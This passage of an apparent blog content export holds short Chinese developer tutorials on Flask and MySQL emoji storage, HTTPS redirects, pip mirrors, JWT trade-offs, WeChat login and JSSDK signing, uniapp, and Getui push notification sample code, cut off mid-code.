        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>flask如何在mysql中储存emoji表情</title>
    <url>/2020/05/17/flask-emoji/</url>
    <content><![CDATA[<p>flask中储存emoji表情方法<br><a id="more"></a></p>
<p>emoji表情在日常的使用中比较多，因此要设置mysql和flaks的config，让emoji可以正常的存储在服务器上</p>
<ol>
<li>修改flask的config</li>
</ol>
<p><code>SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://db_user:db_user_pwd@address:port/db_name?charset=utf8mb4&#39;</code></p>
<p>注意在SQLALCHEMY_DATABASE_URI的的尾部加上<code>?charset=utf8mb4</code></p>
<ol start="2">
<li>修改mysql的字段的格式</li>
</ol>
<p>mysql中定义的一般是utf8_general_ci，要修改为utf8mb4_general_ci</p>
<p>在models的数据表中修改<code>__table_args__ = {&#39;mysql_collate&#39;: &#39;utf8mb4_general_ci&#39;}</code></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-2/">flask常用配置，flask配置文件config.py</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>flask的http和https的重定向和https强制使用办法</title>
    <url>/2020/05/17/flask-http-https/</url>
    <content><![CDATA[<p>flask使用https的nginx和flask中的解决办法<br><a id="more"></a></p>
<p><code>Mixed Content: The page at &#39;&lt;URL&gt;&#39; was loaded over HTTPS, but requested an insecure form action &#39;&lt;URL&gt;&#39;. This request has been blocked; the content must be served over HTTPS.</code></p>
<p>解决办法</p>
<p><code>return redirect(url_for(&#39;********&#39;, _external=True, _scheme=&#39;https&#39;))</code><br>加上 _external=True, _scheme=’https 即可</p>
<p>Nginx中这样修改<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name ******;</span><br><span class="line">    return 301 https://$server_name$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-2/">flask常用配置，flask配置文件config.py</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>python pip设置阿里源，pip windows mac Linux通过换源方法</title>
    <url>/2020/05/16/python-5/</url>
    <content><![CDATA[<p>pip windows、mac和Linux通用的pip换源方法<br><a id="more"></a></p>
<p>pip更换国内源的话可以加速python Module</p>
<p>针对三个端通过的pip换源方法如下</p>
<p><code>pip config set global.index-url  https://mirrors.aliyun.com/pypi/simple</code></p>
<p>直接在终端中输入这个命令即可换源</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>python-4</title>
    <url>/2020/05/16/python-4/</url>
    <content><![CDATA[<a id="more"></a>
]]></content>
  </entry>
  <entry>
    <title>python的深拷贝和浅拷贝区别</title>
    <url>/2020/05/16/python-3/</url>
    <content><![CDATA[<p>python的深拷贝和浅拷贝区别<br><a id="more"></a></p>
<p>在浅拷贝时，拷贝出来的新对象的地址和原对象是不一样的，但是新对象里面的可变元素（如列表）的地址和原对象里的可变元素的地址是相同的，也就是说浅拷贝它拷贝的是浅层次的数据结构（不可变元素），对象里的可变元素作为深层次的数据结构并没有被拷贝到新地址里面去，而是和原对象里的可变元素指向同一个地址，所以在新对象或原对象里对这个可变元素做修改时，两个对象是同时改变的，但是深拷贝不会这样，这个是浅拷贝相对于深拷贝最根本的区别。</p>
<p>例如</p>
<p>copy.copy(x)<br>返回 x 的浅层复制。</p>
<p>copy.deepcopy(x[, memo])<br>返回 x 的深层复制。</p>
<p>a= [[1,2,3],4,5]</p>
<p>b是a的深拷贝的话，那么a中[1,2,3]变化不会导致b的改变<br>b是a的浅拷贝的话，那么a中[1,2,3]变化会导致b的改变</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/01/30/sphinx/">sphinx教程，免费搭建你的文档网站</a></li><li><a href="https://thelighter.github.io/2019/05/26/python-ai/">python人工智能必会的模块扩展</a></li><li><a href="https://thelighter.github.io/2019/05/26/requeset-1/">Python Requests用法总结大全</a></li></ul></div>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt的优点和不足，以及jwt的缺点解决办法</title>
    <url>/2020/05/16/jwt-1/</url>
    <content><![CDATA[<p>jwt优缺点和如何改进jwt<br><a id="more"></a></p>
<h1 id="JWT优点"><a href="#JWT优点" class="headerlink" title="JWT优点"></a>JWT优点</h1><ol>
<li>可扩展性好</li>
</ol>
<p>应用程序分布式部署的情况下，session需要做多机数据共享<br>而jwt不需要存储到服务器，适用于多个客户端使用</p>
<ol start="2">
<li>占用内存少</li>
</ol>
<p>不需要存储在服务器，不需要占储存空间</p>
<ol start="3">
<li>token适用性好<br>pc、app和小程序都可以使用token，而session基于cookies只能用于浏览器</li>
</ol>
<h1 id="jwt缺点"><a href="#jwt缺点" class="headerlink" title="jwt缺点"></a>jwt缺点</h1><ol>
<li><p>安全性<br>由于jwt的payload是使用base64编码的，并没有加密<br>因此不要在payload中放关于用户的关键信息，建议放用户的id号即可</p>
</li>
<li><p>性能</p>
</li>
</ol>
<p>如果在jwt的payload中放置太多的数据，通过http传输会占用流量开销</p>
<ol start="3">
<li><p>一次性<br>无状态是JWT的特点，但也导致了这个问题，JWT是一次性的。想修改里面的内容，就必须签发一个新的JWT。</p>
</li>
<li><p>废弃token</p>
</li>
</ol>
<p>如何禁止废弃一个token，因为token是存储在客户端的，服务端不好控制，只能通过加一个token黑名单来禁止某些token登录。另一方面，可以给每个用户生成一个随机数加载到payload中，通过这个随机数来判断是否token被禁止。</p>
<ol start="5">
<li>续签</li>
</ol>
<p>在用户重新打开客户端时，判断token是否过期如果没有则返回新的token，过期则让用户重新登录。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/18/jwt/">jwt的前生今世</a></li></ul></div>]]></content>
      <categories>
        <category>jwt</category>
      </categories>
      <tags>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>app、公众号网页和小程序实现用户账号统一</title>
    <url>/2020/05/10/weixin-7/</url>
    <content><![CDATA[<p>微信不同用户端如何互通<br><a id="more"></a></p>
<p>app、公众号和小程序实现用户账号统一</p>
<p>实现不同应用的用户账号统一使用的是unionid,在微信开放平台进行绑定之后，每种应用的unionid都是相同的，但是获取到的用户的openid是不同。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/10/weixin-6/">微信app登录教程</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-5/">微信公众号网页jssdk使用方法</a></li><li><a href="https://thelighter.github.io/2020/04/25/weixin-4/">微信公众号H5网页登录授权过程</a></li><li><a href="https://thelighter.github.io/2020/02/13/weixin-1/">微信客服消息报错45015</a></li></ul></div>]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title>微信app登录教程</title>
    <url>/2020/05/10/weixin-6/</url>
    <content><![CDATA[<p>微信app登录<br><a id="more"></a></p>
<p>授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与”服务提供商”的认证服务器进行互动。<br>它的步骤如下：</p>
<p>（A）用户访问客户端，后者将前者导向认证服务器。</p>
<p>（B）用户选择是否给予客户端授权。</p>
<p>（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的”重定向URI”（redirection URI），同时附上一个授权码。</p>
<p>（D）客户端收到授权码，附上早先的”重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</p>
<p>（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）</p>
<p>通过access token可以获取用户openid和unionid等字段</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/10/weixin-7/">app、公众号网页和小程序实现用户账号统一</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-5/">微信公众号网页jssdk使用方法</a></li><li><a href="https://thelighter.github.io/2020/04/25/weixin-4/">微信公众号H5网页登录授权过程</a></li><li><a href="https://thelighter.github.io/2020/02/13/weixin-1/">微信客服消息报错45015</a></li></ul></div>]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title>微信公众号网页jssdk使用方法</title>
    <url>/2020/05/10/weixin-5/</url>
    <content><![CDATA[<p>微信H5中会用到给好友分享和朋友圈分享<br><a id="more"></a></p>
<ol>
<li>绑定域名<br>先登录微信公众平台进入“公众号设置”的“功能设置”里填写“JS接口安全域名”。<br>这样你的jssdk才能正常使用</li>
</ol>
<ol start="2">
<li>引入js文件</li>
</ol>
<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;https://res.wx.qq.com/open/js/jweixin-1.3.2.js&quot;&gt;&lt;/script&gt;</code></p>
<p>或者你下载js文件，然后在vue或者react项目中应用即可</p>
<ol start="3">
<li>从后端取得四个关键参数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">appId: appId,//必填，公众号的唯一标识</span><br><span class="line">timestamp: timestamp,// 必填，生成签名的时间戳</span><br><span class="line">nonceStr: nonStr,// 必填，生成签名的随机串</span><br><span class="line">signature: signature,// 必填，签名</span><br></pre></td></tr></table></figure>
<p>jsapi_ticket获取办法</p>
<p>生成签名之前必须先了解一下jsapi_ticket，jsapi_ticket是公众号用于调用微信JS接口的临时票据。正常情况下，jsapi_ticket的有效期为7200秒，通过access_token来获取。由于获取jsapi_ticket的api调用次数非常有限，频繁刷新jsapi_ticket会导致api调用受限，影响自身业务，开发者必须在自己的服务全局缓存jsapi_ticket 。</p>
<p>参考以下文档获取access_token（有效期7200秒，开发者必须在自己的服务全局缓存access_token）：<a href="https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html</a></p>
<p>用第一步拿到的access_token 采用http GET方式请求获得jsapi_ticket（有效期7200秒，开发者必须在自己的服务全局缓存jsapi_ticket）：<a href="https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=ACCESS_TOKEN&amp;type=jsapi" target="_blank" rel="noopener">https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=ACCESS_TOKEN&amp;type=jsapi</a></p>
<p>signature生成办法——参与签名的字段包括noncestr（随机字符串）, 有效的jsapi_ticket, timestamp（时间戳）, url（当前网页的URL，不包含#及其后面部分） 。对所有待签名参数按照字段名的ASCII 码从小到大排序（字典序）后，使用URL键值对的格式（即key1=value1&amp;key2=value2…）拼接成字符串string1</p>
<p>例如<code>jsapi_ticket=sM4AOVdWfPE4DxkXGEs8VMCPGGVi4C3VM0P37wVUCFvkVAy_90u5h9nbSlYy3-Sl-HhTdfl2fzFy1AOcHKP7qg&amp;noncestr=Wm3WZYTPz0wzccnW&amp;timestamp=1414587457&amp;url=http://mp.weixin.qq.com?params=value</code></p>
<p>可以通过以下网址验证是否正确</p>
<p><code>https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=jsapisign</code></p>
<ol start="4">
<li>使用wx.config</li>
</ol>
<p>wx.config({<br>            debug: false, //默认为false 为true的时候是调试模式，开启调试模式,调用的所有api的返回值会在客户端alert出<br>            appId: appId,//必填，公众号的唯一标识<br>            timestamp: timestamp,// 必填，生成签名的时间戳<br>            nonceStr: nonStr,// 必填，生成签名的随机串<br>            signature: signature,// 必填，签名<br>            // 必填，需要使用的JS接口列表<br>            jsApiList: [<br>              ‘checkJsApi’,<br>              ‘onMenuShareTimeline’,<br>              ‘onMenuShareAppMessage’,<br>              ‘onMenuShareQQ’,<br>              ‘onMenuShareWeibo’,<br>              ‘onMenuShareQZone’,<br>              ‘updateAppMessageShareData’,<br>              ‘updateTimelineShareData’,<br>            ],<br>          });</p>
<p>debug为true时，你可以再到config使用是否加载成功，转发和分享是否完成<br>jsApiList使用哪些功能就添加哪些功能</p>
<p>具体功能如下：<a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html#62" target="_blank" rel="noopener">微信jssdk大全</a></p>
<h1 id="微信网页jssdk使用说明和-invalid-分析"><a href="#微信网页jssdk使用说明和-invalid-分析" class="headerlink" title="微信网页jssdk使用说明和 invalid 分析"></a>微信网页jssdk使用说明和 invalid 分析</h1><p>总的来说，微信网页包含了很多功能从支付到定位，样样都有，但是用的不是h5+的，而是微信自己的，微信自己的东西就需要去授权（付费的公众号），然后把当前网页的url返回给后端，后端根据通过access_token请求到的jsapi_ticket、时间戳、随机字段和url加密hash生成签名即可。</p>
<p>所以需要在公众号里把js安全域名绑定了才行，同时在接口配置页面检查是否把你的服务器的域名加入了信任域名？在基本配置页面检查是否把你的服务器的 IP 地址加入了白名单？</p>
<p>config中nonceStr（js中驼峰标准大写S）, timestamp与用以签名中的对应noncestr, timestamp一致。</p>
<p>确认url是页面完整的url(请在当前页面alert(location.href.split(‘#’)[0])确认)，包括’http(s)://‘部分，以及’？’后面的GET参数部分,但不包括’#’hash后面的部分</p>
<p>确保一定缓存access_token和jsapi_ticket。</p>
<p>页面一旦分享，微信客户端会在你的链接末尾加入其它参数，如果不是动态获取当前链接，将导致分享后的页面签名失败</p>
<p>vue的hash模式会带#在url中，而微信分享的link中会带上from=singlemessage的字段，导致url出问题解决办法如下</p>
<ol>
<li>将hash分开：将hash前后分开，微信就不会将from=singlemessage拼接<br>(window.location.href).replace(window.location.search,’’)</li>
</ol>
<ol start="2">
<li><p>正则替换 ?from=singlemessage&amp;isappinstalled=0<br>这一步需要在 vue 全局路由里完成，操作如下：<br>// router.js<br>router.beforeEach((to, from, next) =&gt; {<br> let url = window.location.href;<br> if (url.includes(‘?from=’)) { // 判断是否携带了 from 参数，这一步灵活变通，只要能判断出是从微信分享链接进来的就 OK</p>
<pre><code>url = url.replace(/vip.+.#/, &apos;vip/#&apos;); // 利用正则表达式去掉微信携带的 ?from=singlemessage&amp;isappinstalled=0 这串参数，如果这串参数对于你当前的页面有用处的话，可以重新拼接到你正常的链接后面去
window.location.href = url; // 重定向到正常链接
</code></pre><p> }<br>})</p>
</li>
<li><p>前端页面中转，重定向</p>
</li>
<li><p>后端重定向</p>
</li>
</ol>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/10/weixin-7/">app、公众号网页和小程序实现用户账号统一</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-6/">微信app登录教程</a></li><li><a href="https://thelighter.github.io/2020/04/25/weixin-4/">微信公众号H5网页登录授权过程</a></li><li><a href="https://thelighter.github.io/2020/02/13/weixin-1/">微信客服消息报错45015</a></li></ul></div>]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp中获取的this赋值变量为undefined</title>
    <url>/2020/05/06/uniapp-5/</url>
    <content><![CDATA[<p>uniapp中获取的this赋值变量为undefined解决办法<br><a id="more"></a></p>
<p>在使用uniapp的某些接口时，由于嵌套多层函数导致this不是全局的this，这样需要指定一个变量来指向this</p>
<p>比如在使用uni.request这个接口是，在这个函数使用之前就指定 <code>let that = this</code> ，然后在使用uni.request函数内给全局变量赋值时，使用that即可。</p>
]]></content>
      <categories>
        <category>uniapp</category>
      </categories>
  </entry>
  <entry>
    <title>ios应用无法通过Application Loader上传到app store，报错ERROR ITMS-90596</title>
    <url>/2020/05/06/uniapp-4/</url>
    <content><![CDATA[<p>ERROR ITMS-90596错误处理办法<br><a id="more"></a></p>
<p>上传ios应用需要xcode和Application Loader是最新版本，如果你当前为最新版本，还是报错的话，说明你的mac操作系统的版本不够高，需要升级系统，然后再升级Application Loader和xcode才行</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-6/">iOS开发中Certificates、Identifiers和Profiles的定义</a></li></ul></div>]]></content>
      <categories>
        <category>ios开发</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp和HTML5+ app开启iOS13暗黑模式教程</title>
    <url>/2020/05/06/uniapp-3/</url>
    <content><![CDATA[<p>uniapp也能适应暗黑主题模式，配置起来也不难<br><a id="more"></a></p>
<p>iOS13苹果打造了暗黑模式（DarkMode），在暗黑模式下，系统界面配色都会相应变暗，有利于保护使用者的眼睛，同时app需要适配才行，不适配是没有暗黑效果的。</p>
<p>uniapp和HTML5+ app可以同过简单的配置完成复杂的暗黑模式操作</p>
<h1 id="uniapp修改自动适配暗黑模式"><a href="#uniapp修改自动适配暗黑模式" class="headerlink" title="uniapp修改自动适配暗黑模式"></a>uniapp修改自动适配暗黑模式</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&quot;app-plus&quot;: &#123;  </span><br><span class="line">&quot;distribute&quot;: &#123;  </span><br><span class="line">  &quot;ios&quot;: &#123;  </span><br><span class="line">   &quot;UIUserInterfaceStyle&quot;: &quot;Automatic&quot;,  </span><br><span class="line">    //...  </span><br><span class="line">  &#125;,  </span><br><span class="line">  //...  </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>html5+</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;plus&quot;: &#123;  </span><br><span class="line">&quot;distribute&quot;: &#123;  </span><br><span class="line">  &quot;apple&quot;: &#123;  </span><br><span class="line">   &quot;UIUserInterfaceStyle&quot;: &quot;Automatic&quot;,  </span><br><span class="line">    //...  </span><br><span class="line">  &#125;,  </span><br><span class="line">  //...  </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<h1 id="获取当前主题模式"><a href="#获取当前主题模式" class="headerlink" title="获取当前主题模式"></a>获取当前主题模式</h1><p>uniapp内置了plus接口，可以自动获取当前的主题模式。plus.navigator.getUiStyle获取当前系统外观模式。<br>返回”dark”表示当前为暗黑模式（DarkMode），”light”表示当前为普通模式（LightMode）</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/26/uniapp-2/">uniapp的uni.request使用方法</a></li><li><a href="https://thelighter.github.io/2020/02/07/uniapp-1/">uniapp框架GitHub演示地址</a></li></ul></div>]]></content>
      <categories>
        <category>uniapp</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>免费安卓ios推送平台——个推</title>
    <url>/2020/05/05/getui/</url>
    <content><![CDATA[<p>个推python使用文档<br><a id="more"></a></p>
<p>我们日常手机使用中，经常使用消息推送功能，可以很好地快速给用户推送消息<br>个推作为一个强大的消息推送服务平台，可以快速免费集成消息推送服务到我们的app上，出色完成app消息的推送功能。</p>
<ol>
<li><p>首先我们需要在个推平台上注册应用，生成对应的appId、appKey、masterSecret,注册地址——<a href="https://dev.getui.com/#/appManage/addApp" target="_blank" rel="noopener">https://dev.getui.com/#/appManage/addApp</a></p>
</li>
<li><p>在推送消息中，我们可以定义title、text、logo和url，对应着手机上推送消息的题目、内容、图标和跳转的url</p>
</li>
<li><p>消息推送支持离线和在线推送，离线推送需要和手机系统的平台上注册取得对应的id和密码</p>
</li>
<li><p>支持单用户推送消息、对指定用户列表推送消息、群推消息、定时推送消息、批量单推、短信补量</p>
</li>
<li><p>可以自定义模板，支持点击通知打开应用模板、点击通知打开网页模板、点击下载模板、透传自定义模板</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from igetui.igt_message import IGtAppMessage</span><br><span class="line">from igetui.template.igt_link_template import LinkTemplate</span><br><span class="line">from igt_push import IGeTui</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#定义常量, appId、appKey、masterSecret 采用本文档 &quot;第二步 获取访问凭证 &quot;中获得的应用配置</span><br><span class="line">APPID = &apos;&apos;;</span><br><span class="line">APPKEY = &apos;&apos;;</span><br><span class="line">MASTERSECRET = &apos;&apos;;</span><br><span class="line">CID = &apos;&apos;;</span><br><span class="line">HOST = &apos;http://sdk.open.api.igexin.com/apiex.htm&apos;</span><br><span class="line"></span><br><span class="line">def pushMessageToApp():</span><br><span class="line">    push = IGeTui(HOST, APPKEY, MASTERSECRET)</span><br><span class="line"></span><br><span class="line">    # 新建一个推送模版, 以链接模板为例子，就是说在通知栏显示一条含图标、标题等的通知，用户点击可打开您指定的网页</span><br><span class="line">    template = LinkTemplate()</span><br><span class="line">    template.appId = APPID</span><br><span class="line">    template.appKey = APPKEY</span><br><span class="line">    template.title = &quot;请填写通知标题!&quot;</span><br><span class="line">    template.text = &quot;请填写通知内容~&quot;</span><br><span class="line">    template.logo = &quot;&quot;</span><br><span class="line">    template.url = &quot;http://www.baidu.com&quot;</span><br><span class="line">    template.transmissionType = 1</span><br><span class="line">    template.transmissionContent = &apos;&apos;</span><br><span class="line">    template.isRing = True</span><br><span class="line">    template.isVibrate = True</span><br><span class="line">    template.isClearable = True</span><br><span class="line"></span><br><span class="line">    #定义&quot;AppMessage&quot;类型消息对象，设置消息内容模板、发送的目标App列表、是否支持离线发送、以及离线消息有效期(单位毫秒)</span><br><span class="line">    message = IGtAppMessage()</span><br><span class="line">    message.data = template</span><br><span class="line">    message.isOffline = True</span><br><span class="line">    message.offlineExpireTime = 1000 * 600</span><br><span class="line">    message.appIdList.extend([APPID])</span><br><span class="line"></span><br><span class="line">    ret = push.pushMessageToApp(message)</span><br><span class="line">    print (ret)</span><br><span class="line"></span><br><span class="line">pushMessageToApp()</span><br></pre></td></tr></table></figure>
<p>指定列表推送消息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from igt_push import *</span><br><span class="line">from igetui.template import *</span><br><span class="line">from igetui.template.igt_base_template import *</span><br><span class="line">from igetui.template.igt_transmission_template import *</span><br><span class="line">from igetui.template.igt_link_template import *</span><br><span class="line">from igetui.template.igt_notification_template import *</span><br><span class="line">from igetui.template.igt_notypopload_template import *</span><br><span class="line">from igetui.igt_message import *</span><br><span class="line">from igetui.igt_target import *</span><br><span class="line">from igetui.template import *</span><br><span class="line">import os</span><br><span class="line">#toList接口每个用户返回用户状态开关,true：打开 false：关闭</span><br><span class="line">os.environ[&apos;gexin_pushList_needDetails&apos;] = &apos;false&apos;</span><br><span class="line"></span><br><span class="line">#采用&quot;Python3 SDK 快速入门&quot;， &quot;第二步 获取访问凭证 &quot;中获得的应用配置</span><br><span class="line">APPKEY = &quot;&quot;</span><br><span class="line">APPID = &quot;&quot;</span><br><span class="line">MASTERSECRET = &quot;&quot;</span><br><span class="line">CID1 = &quot;&quot;</span><br><span class="line">CID2 = &quot;&quot;</span><br><span class="line">#ALIAS1= &quot;&quot;</span><br><span class="line">#ALIAS2= &quot;&quot;</span><br><span class="line">HOST = &apos;http://sdk.open.api.igexin.com/apiex.htm&apos;</span><br><span class="line"></span><br><span class="line">def pushMessageToList():</span><br><span class="line">    push = IGeTui(HOST, APPKEY, MASTERSECRET)</span><br><span class="line"></span><br><span class="line">    # 消息模版：</span><br><span class="line">    # NotificationTemplate：通知透传功能模板  </span><br><span class="line">    template = TransmissionTemplateDemo()</span><br><span class="line"></span><br><span class="line">    message = IGtListMessage()</span><br><span class="line">    message.data = template</span><br><span class="line">    message.isOffline = True</span><br><span class="line">    message.offlineExpireTime = 1000 * 3600 * 12</span><br><span class="line">    message.pushNetWorkType = 0</span><br><span class="line"></span><br><span class="line">    target1 = Target()</span><br><span class="line">    target1.appId = APPID</span><br><span class="line">    target1.clientId = CID1</span><br><span class="line">#   target1.alias = Alias1</span><br><span class="line">    target2 = Target()</span><br><span class="line">    target2.appId = APPID</span><br><span class="line">    target2.clientId = CID2</span><br><span class="line">#   target2.alias = Alias2</span><br><span class="line">    arr = []</span><br><span class="line"></span><br><span class="line">    arr.append(target1)</span><br><span class="line">    arr.append(target2)</span><br><span class="line">    contentId = push.getContentId(message, &apos;ToList_任务别名_可为空&apos;)</span><br><span class="line">    ret = push.pushMessageToList(contentId, arr)</span><br><span class="line">    print (ret)</span><br><span class="line"></span><br><span class="line"># 通知透传模板动作内容</span><br><span class="line">def TransmissionTemplateDemo():</span><br><span class="line">    template = TransmissionTemplate()</span><br><span class="line">    template.transmissionType = 1</span><br><span class="line">    template.appId = APPID</span><br><span class="line">    template.appKey = APPKEY</span><br><span class="line">    template.transmissionContent = &apos;请输入您要透传内容&apos;</span><br><span class="line">#   iOS setAPNInfo</span><br><span class="line">#   apnpayload = APNPayload()</span><br><span class="line">#   apnpayload.badge = 4</span><br><span class="line">#   apnpayload.sound = &quot;sound&quot;</span><br><span class="line">#   apnpayload.addCustomMsg(&quot;payload&quot;, &quot;payload&quot;)</span><br><span class="line">#   apnpayload.contentAvailable = 1</span><br><span class="line">#   apnpayload.category = &quot;ACTIONABLE&quot;</span><br><span class="line">#                 </span><br><span class="line">#   alertMsg = DictionaryAlertMsg()</span><br><span class="line">#   alertMsg.body = &apos;body&apos;</span><br><span class="line">#   alertMsg.actionLocKey = &apos;actionLockey&apos;</span><br><span class="line">#   alertMsg.locKey = &apos;lockey&apos;</span><br><span class="line">#   alertMsg.locArgs=[&apos;locArgs&apos;]</span><br><span class="line">#   alertMsg.launchImage = &apos;launchImage&apos;</span><br><span class="line">#   iOS8.2以上版本支持</span><br><span class="line">#   alertMsg.title = &apos;Title&apos;</span><br><span class="line">#   alertMsg.titleLocArgs = [&apos;TitleLocArg&apos;]</span><br><span class="line">#   alertMsg.titleLocKey = &apos;TitleLocKey&apos;</span><br><span class="line">#   apnpayload.alertMsg=alertMsg</span><br><span class="line">#   template.setApnInfo(apnpayload)</span><br><span class="line"></span><br><span class="line">    # 设置通知定时展示时间，结束时间与开始时间相差需大于6分钟，消息推送后，客户端将在指定时间差内展示消息（误差6分钟）</span><br><span class="line">    #begin = &quot;2015-03-04 17:40:22&quot;;</span><br><span class="line">    #end = &quot;2015-03-04 17:47:24&quot;;</span><br><span class="line">    #template.setDuration(begin, end)</span><br><span class="line">    return template</span><br><span class="line">    print (ret)</span><br><span class="line"></span><br><span class="line">pushMessageToList()</span><br></pre></td></tr></table></figure>
<p>定时推送，需要去申请才行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#</span><br><span class="line">from igt_push import *</span><br><span class="line">from igetui.template import *</span><br><span class="line">from igetui.template.igt_base_template import *</span><br><span class="line">from igetui.template.igt_transmission_template import *</span><br><span class="line">from igetui.template.igt_link_template import *</span><br><span class="line">from igetui.template.igt_notification_template import *</span><br><span class="line">from igetui.template.igt_notypopload_template import *</span><br><span class="line">from igetui.igt_message import *</span><br><span class="line">from igetui.igt_target import *</span><br><span class="line">from igetui.template import *</span><br><span class="line"></span><br><span class="line">#采用&quot;Python3 SDK 快速入门&quot;， &quot;第二步 获取访问凭证 &quot;中获得的应用配置</span><br><span class="line">APPKEY = &quot;&quot;</span><br><span class="line">APPID = &quot;&quot;</span><br><span class="line">MASTERSECRET = &quot;&quot;</span><br><span class="line">CID = &quot;&quot;</span><br><span class="line">HOST = &apos;http://sdk.open.api.igexin.com/apiex.htm&apos;</span><br><span class="line">def pushMessageToApp():</span><br><span class="line">    push = IGeTui(HOST, APPKEY, MASTERSECRET)</span><br><span class="line"></span><br><span class="line">    # 消息模版：</span><br><span class="line">    # 1.TransmissionTemplate:透传功能模板</span><br><span class="line">    # 2.LinkTemplate:通知打开链接功能模板</span><br><span class="line">    # 3.NotificationTemplate：通知透传功能模板</span><br><span class="line">    # 4.NotyPopLoadTemplate：通知弹框下载功能模板</span><br><span class="line"></span><br><span class="line">    template = NotificationTemplateDemo()</span><br><span class="line">    # template = LinkTemplateDemo()</span><br><span class="line">    # template = TransmissionTemplateDemo()</span><br><span class="line">    # template = NotyPopLoadTemplateDemo()</span><br><span class="line"></span><br><span class="line">    message = IGtAppMessage()</span><br><span class="line">    message.data = template</span><br><span class="line">    message.isOffline = True</span><br><span class="line">    message.offlineExpireTime = 1000 * 3600 * 12</span><br><span class="line">    message.appIdList.extend([APPID])</span><br><span class="line">    # 定时任务</span><br><span class="line">    message.pushTime = &quot;201809051950&quot;</span><br><span class="line"></span><br><span class="line">    conditions = AppConditions()</span><br><span class="line">    phoneType = [&apos;ANDROID&apos;]</span><br><span class="line">    tags = 